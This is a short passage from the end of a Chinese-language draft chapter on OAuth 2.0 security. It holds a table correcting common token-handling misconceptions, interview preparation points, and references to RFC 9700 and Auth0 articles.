| Access Token 可做身份验证 | 使用 ID Token 进行身份验证 |
| localStorage 可存储令牌 | 使用 HttpOnly Cookie 或后端存储 |
| Access Token 可长期有效 | 应该短期有效 (15-60 分钟) |

**面试准备要点**：
1. **基础概念**：OAuth 核心思想、授权模式对比、PKCE 原理
2. **安全知识**：CSRF 防护、令牌泄露应对、JWT 撤销
3. **实战设计**：第三方登录方案、微服务认证架构

---

**来源引用**：
- RFC 9700: OAuth 2.0 Security Best Current Practice
- OAuth 2.0 常见误区：https://auth0.com/blog/oauth2-reality-vs-myth/
- JWT 撤销方案：https://auth0.com/blog/jwt-ultimate-guide/

---

*本章草稿保存于：`.work/oauth/drafts/chapter-8.md`*
*字数：约 4500 字*
